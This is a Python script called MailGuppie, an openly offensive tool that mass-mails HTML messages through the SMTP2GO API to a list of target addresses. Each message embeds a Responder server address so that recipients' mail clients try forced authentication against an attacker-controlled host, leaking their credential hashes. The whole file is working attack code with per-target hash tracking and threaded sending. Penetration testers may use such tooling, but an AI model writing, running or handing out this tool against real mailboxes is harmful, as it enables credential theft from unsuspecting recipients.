#!/usr/bin/env python3
"""
MailGuppie - SMTP2GO HTML Forced Authentication Email Sender

Usage:
    python3 MailGuppie.py -t targets.txt -r 10.10.10.10
    python3 MailGuppie.py -t targets.txt -r 10.10.10.10 -c config/template.conf
"""

import argparse
import json
import hashlib
import re
import sys
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import requests


def generate_sha3_hash(email):
    hasher = hashlib.sha3_256()
    hasher.update(email.encode('utf-8'))
    return hasher.hexdigest()[22:42]


def load_api_credentials(key_path):
    credentials = {}
    with open(key_path, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#') and ':' in line:
                key, value = line.split(':', 1)
                credentials[key.strip()] = value.strip()
    return credentials


def parse_template(template_path):
    with open(template_path, 'r') as f:
        content = f.read()
    lines = content.split('\n')
    variables = {}
    template_start = 0
    for i, line in enumerate(lines):
        if line.strip().startswith('#'):
            match = re.match(r'#\s*(\w+):\s*(.+)', line)
            if match:
                variables[match.group(1).strip()] = match.group(2).strip()
        elif line.strip() and not line.strip().startswith('#'):
            template_start = i
            break
    return variables, '\n'.join(lines[template_start:])


def replace_template_variables(html, variables, target_email, hash_value):
    replacements = {
        '<SHA3_HASH>':    hash_value,
        '<TARGET_EMAIL>': target_email,
        **{f'<{k}>': v for k, v in variables.items()}
    }
    result = html
    for placeholder, value in replacements.items():
        result = result.replace(placeholder, value)
    return result


def send_email(target, api_key, sender_email, sender_name, subject, html_template, variables):
    try:
        hash_value = generate_sha3_hash(target)
        html_body  = replace_template_variables(html_template, variables, target, hash_value)
        sender     = f"{sender_name} <{sender_email}>" if sender_name else sender_email

        response = requests.post(
            "https://api.smtp2go.com/v3/email/send",
            headers={"Content-Type": "application/json"},
            data=json.dumps({
                "api_key":   api_key,
                "to":        [target],
                "sender":    sender,
                "subject":   subject,
                "html_body": html_body
            }),
            timeout=10
        )

        result    = response.json() if response.content else {}
        succeeded = result.get('data', {}).get('succeeded', 0)

        if response.status_code == 200 and succeeded > 0:
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[+] {target}  hash:{hash_value}  {ts}")
            return True, target
        else:
            error = result.get('data', {}).get('error') or response.text[:200]
            print(f"[-] {target}  ERROR: {error}")
            return False, target

    except Exception as e:
        print(f"[-] {target}  ERROR: {e}")
        return False, target


def main():
    banner = """
╔════════════════════════════════════════════════╗
║                  MailGuppie                    ║
╚════════════════════════════════════════════════╝

          ><((((º>   ><((((º>   ><((((º>
"""

    parser = argparse.ArgumentParser(
        usage='%(prog)s -t <targets.txt> -r <responder-ip> [options]',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=__doc__
    )
    parser.add_argument('-t', '--targets',  required=True,
                        help='Target email list (.txt, one address per line)',
                        metavar='<targets.txt>')
    parser.add_argument('-r', '--responder', required=True,
                        help='Responder server IP/hostname',
                        metavar='<responder-ip>')
    parser.add_argument('-c', '--config', default='config/template.conf',
                        help='Template config file (default: config/template.conf)',
                        metavar='<template.conf>')

    if len(sys.argv) == 1:
        print(banner)
        parser.print_help()
        return

    args = parser.parse_args()
    print(banner)

    # ── Load template ─────────────────────────────────────────────────────────
    template_path = Path(args.config)
    if not template_path.exists():
        print(f"[-] Template not found: {template_path}")
        return

    print(f"[*] Template:  {template_path}")
    variables, html_template = parse_template(template_path)
    variables['RESPONDER']   = args.responder

    sender_email = variables.get('SENDER')
    sender_name  = variables.get('SENDER_NAME', '')
    subject      = variables.get('SUBJECT', 'No Subject')

    if not sender_email:
        print("[-] SENDER not set in template")
        return

    print(f"[*] Sender:    {sender_name} <{sender_email}>")
    print(f"[*] Subject:   {subject}")

    # ── Load targets ──────────────────────────────────────────────────────────
    with open(args.targets, 'r') as f:
        targets = [line.strip() for line in f if line.strip()]

    print(f"[*] Targets:   {len(targets)}")

    # ── Load API key ──────────────────────────────────────────────────────────
    key_path = Path('config/key.conf')
    if not key_path.exists():
        print(f"[-] API key file not found: {key_path}")
        return

    credentials = load_api_credentials(key_path)
    api_key     = credentials.get('API_KEY')
    if not api_key:
        print("[-] API_KEY missing in config/key.conf  (format: API_KEY:your_key)")
        return

    # ── Send ──────────────────────────────────────────────────────────────────
    print("[*] Sending...\n")
    success_count = 0
    fail_count    = 0

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(
                send_email,
                target, api_key,
                sender_email, sender_name, subject,
                html_template, variables
            ): target for target in targets
        }
        for future in as_completed(futures):
            ok, _ = future.result()
            if ok:
                success_count += 1
            else:
                fail_count += 1

    print(f"\n[*] Done  success:{success_count}  failed:{fail_count}")


if __name__ == "__main__":
    main()
